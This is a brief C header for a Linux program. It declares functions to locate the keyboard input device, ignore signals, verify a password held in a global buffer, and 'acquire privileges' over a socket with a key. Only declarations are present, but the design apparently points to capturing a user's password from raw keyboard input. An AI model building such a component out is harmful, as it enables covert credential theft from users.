#ifndef HEADERS_H
#define HEADERS_H

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/input.h>
#include <dirent.h>
#include <string.h>
#include <signal.h>
#include <sys/socket.h>
#include <arpa/inet.h>

extern char verified_password[128];

//keyboard linux
int find_keyboard();

void ignore_signal();
int verify_password(const char *pass);
void acquire_privileges_blocked(int *sock, unsigned char *key);

#endif